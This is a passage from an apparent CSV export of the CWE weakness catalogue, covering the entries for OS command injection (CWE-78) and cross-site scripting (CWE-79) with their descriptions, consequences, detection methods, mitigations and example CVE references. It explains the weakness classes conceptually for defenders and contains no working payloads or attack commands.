of Special Elements used in an OS Command ('OS Command Injection')\",Base,Stable,\"The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.\",\"This weakness can lead to a vulnerability in environments in which the attacker does not have direct access to the operating system, such as in web applications. Alternately, if the weakness occurs in a privileged program, it could allow the attacker to specify commands that normally would not be accessible, or to call alternate commands with privileges that the attacker does not have. The problem is exacerbated if the compromised process does not follow the principle of least privilege, because the attacker-controlled commands may run with special system privileges that increases the amount of damage. There are at least two subtypes of OS command injection: The application intends to execute a single, fixed program that is under its own control. It intends to use externally-supplied inputs as arguments to that program. For example, the program might use system(nslookup [HOSTNAME]) to run nslookup and allow the user to supply a HOSTNAME, which is used as an argument. Attackers cannot prevent nslookup from executing. However, if the program does not remove command separators from the HOSTNAME argument, attackers could place the separators into the arguments, which allows them to execute their own program after nslookup has finished executing. The application accepts an input that it uses to fully select which program to run, as well as which commands to use. The application simply redirects this entire command to the operating system. For example, the program might use exec([COMMAND]) to execute the [COMMAND] that was supplied by the user. If the COMMAND is under attacker control, then the attacker can execute arbitrary commands or programs. If the command is being executed using functions like exec() and CreateProcess(), the attacker might not be able to combine multiple commands together in the same line. From a weakness standpoint, these variants represent distinct programmer errors. In the first variant, the programmer clearly intends that input from untrusted parties will be part of the arguments in the command to be executed. In the second variant, the programmer does not intend for the command to be accessible to any untrusted party, but the programmer probably has not accounted for alternate ways in which malicious attackers can provide input.\",::NATURE:ChildOf:CWE ID:77:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:74:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:77:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:77:VIEW ID:1340:ORDINAL:Primary::NATURE:CanAlsoBe:CWE ID:88:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Shell injection::TERM:Shell metacharacters::TERM:OS Command Injection::\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Non-Repudiation:IMPACT:Execute Unauthorized Code or Commands:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Read Files or Directories:IMPACT:Modify Files or Directories:IMPACT:Read Application Data:IMPACT:Modify Application Data:IMPACT:Hide Activities:NOTE:Attackers could execute unauthorized operating system commands, which could then be used to disable the product, or read and modify data for which the attacker does not have permissions to access directly. Since the targeted application is directly executing the commands instead of the attacker, any malicious activities may appear to come from the application or the application's owner.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives. Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes. Automated static analysis might not be able to detect the usage of custom API functions or third-party libraries that indirectly invoke OS commands, leading to false negatives - especially if the API/library code is not available for analysis.::METHOD:Automated Dynamic Analysis:DESCRIPTION:This weakness can be detected using dynamic tools and techniques that interact with the product using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The product's operation may slow down, but it should not become unstable, crash, or generate incorrect results.:EFFECTIVENESS:Moderate::METHOD:Manual Static Analysis:DESCRIPTION:Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Binary Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Fuzz Tester Framework-based Fuzzer:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Manual Source Code Review (not inspections) Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:If at all possible, use library calls rather than external processes to recreate the desired functionality.::PHASE:Architecture and Design Operation:STRATEGY:Sandbox or Jail:DESCRIPTION:Run the code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.:EFFECTIVENESS:Limited::PHASE:Architecture and Design:STRATEGY:Attack Surface Reduction:DESCRIPTION:For any data that will be used to generate a command to be executed, keep as much of that data out of external control as possible. For example, in web applications, this may require storing the data locally in the session's state instead of sending it out to the client in a hidden form field.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, consider using the ESAPI Encoding control [REF-45] or a similar tool, library, or framework. These will help the programmer encode outputs in a manner less prone to error.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).::PHASE:Implementation:DESCRIPTION:If the program to be executed allows arguments to be specified within an input file or from standard input, then consider using that mode to pass arguments instead of the command line.::PHASE:Architecture and Design:STRATEGY:Parameterization:DESCRIPTION:If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated. Some languages offer multiple functions that can be used to invoke commands. Where possible, identify any function that invokes a command shell using a single string, and replace it with a function that requires individual arguments. These functions typically perform appropriate quoting and filtering of arguments. For example, in C, the system() function accepts a string that contains the entire command to be executed, whereas execl(), execve(), and others require an array of strings, one for each argument. In Windows, CreateProcess() only accepts one command at a time. In Perl, if system() is provided with an array of arguments, then it will quote each of the arguments.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When constructing OS command strings, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping. Note that proper output encoding, escaping, and quoting is the most effective solution for preventing OS command injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent OS command injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, when invoking a mail program, you might need to allow the subject field to contain otherwise-dangerous inputs like ; and > characters, which would need to be escaped or otherwise handled. In this case, stripping the character might reduce the risk of OS command injection, but it would produce incorrect behavior because the subject field would not be recorded as the user intended. This might seem to be a minor inconvenience, but it could be more important when the program relies on well-structured subject lines in order to pass messages to other components. Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.::PHASE:Architecture and Design:STRATEGY:Enforcement by Conversion:DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.::PHASE:Operation:STRATEGY:Compilation or Build Hardening:DESCRIPTION:Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's -T switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).::PHASE:Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's -T switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).::PHASE:Implementation:DESCRIPTION:Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success. If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not. In the context of OS Command Injection, error information passed back to the user might reveal whether an OS command is being executed and possibly which command is being used.::PHASE:Operation:STRATEGY:Sandbox or Jail:DESCRIPTION:Use runtime policy enforcement to create an allowlist of allowable commands, then prevent use of any command that does not appear in the allowlist. Technologies such as AppArmor are available to do this.::PHASE:Operation:STRATEGY:Firewall:DESCRIPTION:Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.:EFFECTIVENESS:Moderate::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.::PHASE:Operation Implementation:STRATEGY:Environment Hardening:DESCRIPTION:When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.::\",\"::REFERENCE:CVE-2020-10987:DESCRIPTION:OS command injection in Wi-Fi router, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-10987::REFERENCE:CVE-2020-10221:DESCRIPTION:Template functionality in network configuration management tool allows OS command injection, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-10221::REFERENCE:CVE-2020-9054:DESCRIPTION:Chain: improper input validation (CWE-20) in username parameter, leading to OS command injection (CWE-78), as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-9054::REFERENCE:CVE-1999-0067:DESCRIPTION:Canonical example of OS command injection. CGI program does not neutralize | metacharacter when invoking a phonebook program.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0067::REFERENCE:CVE-2001-1246:DESCRIPTION:Language interpreter's mail function accepts another argument that is concatenated to a string used in a dangerous popen() call. Since there is no neutralization of this argument, both OS Command Injection (CWE-78) and Argument Injection (CWE-88) are possible.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1246::REFERENCE:CVE-2002-0061:DESCRIPTION:Web server allows command execution using | (pipe) character.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0061::REFERENCE:CVE-2003-0041:DESCRIPTION:FTP client does not filter | from filenames returned by the server, allowing for OS command injection.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0041::REFERENCE:CVE-2008-2575:DESCRIPTION:Shell metacharacters in a filename in a ZIP archive:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2575::REFERENCE:CVE-2002-1898:DESCRIPTION:Shell metacharacters in a telnet:// link are not properly handled when the launching application processes the link.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1898::REFERENCE:CVE-2008-4304:DESCRIPTION:OS command injection through environment variable.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4304::REFERENCE:CVE-2008-4796:DESCRIPTION:OS command injection through https:// URLs:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4796::REFERENCE:CVE-2007-3572:DESCRIPTION:Chain: incomplete denylist for OS command injection:LINK:https://www.cve.org/CVERecord?id=CVE-2007-3572::REFERENCE:CVE-2012-1988:DESCRIPTION:Product allows remote users to execute arbitrary commands by creating a file whose pathname contains shell metacharacters.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-1988::\",::Program Invocation::,::System Process::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:OS Command Injection::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A3:ENTRY NAME:Malicious File Execution:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A6:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ENV03-C:ENTRY NAME:Sanitize the environment when invoking external programs::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ENV33-C:ENTRY NAME:Do not call system():MAPPING FIT:CWE More Specific::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:STR02-C:ENTRY NAME:Sanitize data passed to complex subsystems::TAXONOMY NAME:WASC:ENTRY ID:31:ENTRY NAME:OS Commanding::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:IDS07-J:ENTRY NAME:Do not pass untrusted, unsanitized data to the Runtime.exec() method::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-78::\",::108::15::43::6::88::,\"::TYPE:Terminology:NOTE:The OS command injection phrase carries different meanings to different people. For some people, it only refers to cases in which the attacker injects command separators into arguments for an application-controlled program that is being invoked. For some people, it refers to any type of attack that can allow the attacker to execute OS commands of their own choosing. This usage could include untrusted search path weaknesses (CWE-426) that cause the application to find and execute an attacker-controlled program. Further complicating the issue is the case when argument injection (CWE-88) allows alternate command-line switches or options to be inserted into the command line, such as an -exec switch whose purpose may be to execute the subsequent argument as a command (this -exec switch exists in the UNIX find command, for example). In this latter case, however, CWE-88 could be regarded as the primary weakness in a chain with CWE-78.::TYPE:Research Gap:NOTE:More investigation is needed into the distinction between the OS command injection variants, including the role with argument injection (CWE-88). Equivalent distinctions may exist in other injection-related problems such as SQL injection.::\",\n79,\"Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\",Base,Stable,\"The product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.\",\"Cross-site scripting (XSS) vulnerabilities occur when: Untrusted data enters a web application, typically from a web request. The web application dynamically generates a web page that contains this untrusted data. During page generation, the application does not prevent the data from containing content that is executable by a web browser, such as JavaScript, HTML tags, HTML attributes, mouse events, Flash, ActiveX, etc. A victim visits the generated web page through a web browser, which contains malicious script that was injected using the untrusted data. Since the script comes from a web page that was sent by the web server, the victim's web browser executes the malicious script in the context of the web server's domain. This effectively violates the intention of the web browser's same-origin policy, which states that scripts in one domain should not be able to access resources or run code in a different domain. There are three main kinds of XSS: Type 1: Reflected XSS (or Non-Persistent) - The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser. Type 2: Stored XSS (or Persistent) - The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs. Type 0: DOM-Based XSS - In DOM-based XSS, the client performs the injection of XSS into the page; in the other types, the server performs the injection. DOM-based XSS generally involves server-controlled, trusted script that is sent to the client, such as Javascript that performs sanity checks on a form before the user submits it. If the server-supplied script processes user-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible. Once the malicious script is injected, the attacker can perform a variety of malicious activities. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site. Finally, the script could exploit a vulnerability in the web browser itself possibly taking over the victim's machine, sometimes referred to as drive-by hacking. In many cases, the attack can be launched without the victim even being aware of it. Even with careful users, attackers frequently use a variety of methods to encode the malicious portion of the attack, such as URL encoding or Unicode, so the request looks less suspicious.\",::NATURE:ChildOf:CWE ID:74:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:74:VIEW ID:1003:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:494:VIEW ID:1000::NATURE:PeerOf:CWE ID:352:VIEW ID:1000::,\"::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Web Based:TECHNOLOGY PREVALENCE:Often::,\"::The Same Origin Policy states that browsers should limit the resources accessible to scripts running on a given web site, or origin, to the resources associated with that web site on the client-side, and not the client-side resources of any other sites or origins. The goal is to prevent one site from being able to modify or read the contents of an unrelated site. Since the World Wide Web involves interactions between many sites, this policy is important for browsers to enforce. When referring to XSS, the Domain of a website is roughly equivalent to the resources associated with that website on the client-side of the connection. That is, the domain can be thought of as all resources the browser is storing for the user's interactions with this particular site.::\",\"::TERM:XSS:DESCRIPTION:A common abbreviation for Cross-Site Scripting.::TERM:HTML Injection:DESCRIPTION:Used as a synonym of stored (Type 2) XSS.::TERM:CSS:DESCRIPTION:In the early years after initial discovery of XSS, CSS was a commonly-used acronym. However, this would cause confusion with Cascading Style Sheets, so usage of this acronym has declined significantly.::\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:SCOPE:Confidentiality:IMPACT:Bypass Protection Mechanism:IMPACT:Read Application Data:NOTE:The most common attack performed with cross-site scripting involves the disclosure of information stored in user cookies. Typically, a malicious user will craft a client-side script, which -- when parsed by a web browser -- performs some activity (such as sending all site cookies to a given E-mail address). This script will be loaded and run by each user visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:In some circumstances it may be possible to run arbitrary code on a victim's computer when cross-site scripting is combined with other flaws.::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Bypass Protection Mechanism:IMPACT:Read Application Data:NOTE:The consequence of an XSS attack is the same regardless of whether it is stored or reflected. The difference is in how the payload arrives at the server. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. Some cross-site scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running Active X controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible, especially when multiple components are involved.:EFFECTIVENESS:Moderate::METHOD:Black Box:DESCRIPTION:Use the XSS Cheat Sheet [REF-714] or automated test-generation tools to help launch a wide variety of attacks against your web application. The Cheat Sheet contains many subtle XSS variations that are specifically targeted against weak XSS defenses.:EFFECTIVENESS:Moderate::\",\"::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.::PHASE:Implementation Architecture and Design:DESCRIPTION:Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies. For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters. Parts of the same output document may require different encodings, which will vary depending on whether the output is in the: HTML body Element attributes (such as src=XYZ) URIs JavaScript sections Cascading Style Sheets and style property etc. Note that HTML Entity Encoding is only appropriate for the HTML body. Consult the XSS Prevention Cheat Sheet [REF-724] for more details on the types of encoding and escaping that are needed.::PHASE:Architecture and Design Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.:EFFECTIVENESS:Limited::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Architecture and Design:STRATEGY:Parameterization:DESCRIPTION:If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component. The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.::PHASE:Implementation:DESCRIPTION:With Struts, write all data from form beans with the bean's filter attribute set to true.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.:EFFECTIVENESS:Defense in Depth::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When dynamically constructing web pages, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. All input should be validated and cleansed, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. It is common to see data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended. Note that proper output encoding, escaping, and quoting is the most effective solution for preventing XSS, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, in a chat application, the heart emoticon (<3) would likely pass the validation step, since it is commonly used. However, it cannot be directly inserted into the web page because it contains the < character, which would need to be escaped or otherwise handled. In this case, stripping the < might reduce the risk of XSS, but it would produce incorrect behavior because the emoticon would not be recorded. This might seem to be a minor inconvenience, but it would be more important in a mathematical forum that wants to represent inequalities. Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address. Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.::PHASE:Architecture and Design:STRATEGY:Enforcement by Conversion:DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.::PHASE:Operation:STRATEGY:Firewall:DESCRIPTION:Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.:EFFECTIVENESS:Moderate::PHASE:Operation Implementation:STRATEGY:Environment Hardening:DESCRIPTION:When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.::\",\"::REFERENCE:CVE-2021-25926:DESCRIPTION:Python Library Manager did not sufficiently neutralize a user-supplied search term, allowing reflected XSS.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-25926::REFERENCE:CVE-2021-25963:DESCRIPTION:Python-based e-commerce platform did not escape returned content on error pages, allowing for reflected Cross-Site Scripting attacks.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-25963::REFERENCE:CVE-2021-1879:DESCRIPTION:Universal XSS in mobile operating system, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-1879::REFERENCE:CVE-2020-3580:DESCRIPTION:Chain: improper input validation (CWE-20) in firewall product leads to XSS (CWE-79), as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-3580::REFERENCE:CVE-2014-8958:DESCRIPTION:Admin GUI allows XSS through cookie.:LINK:https://www.cve.org/CVERecord?id=CVE-2014-8958::REFERENCE:CVE-2017-9764:DESCRIPTION:Web stats program allows XSS through crafted HTTP header.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-9764::REFERENCE:CVE-2014-5198:DESCRIPTION:Web log analysis product allows XSS through crafted HTTP Referer header.:LINK:https://www.cve.org/CVERecord?id=CVE-2014-5198::REFERENCE:CVE-2008-5080:DESCRIPTION:Chain: protection mechanism failure allows XSS:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5080::REFERENCE:CVE-2006-4308:DESCRIPTION:Chain: incomplete denylist (CWE-184) only checks javascript: tag, allowing XSS (CWE-79) using other tags:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4308::REFERENCE:CVE-2007-5727:DESCRIPTION:Chain: incomplete denylist (CWE-184) only removes SCRIPT tags, enabling XSS (CWE-79):LINK:https://www.cve.org/CVERecord?id=CVE-2007-5727::REFERENCE:CVE-2008-5770:DESCRIPTION:Reflected XSS using the PATH_INFO in a URL:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5770::REFERENCE:CVE-2008-4730:DESCRIPTION:Reflected XSS not properly handled when generating an error message:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4730::REFERENCE:CVE-2008-5734:DESCRIPTION:Reflected XSS sent through email message.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5734::REFERENCE:CVE-2008-0971:DESCRIPTION:Stored 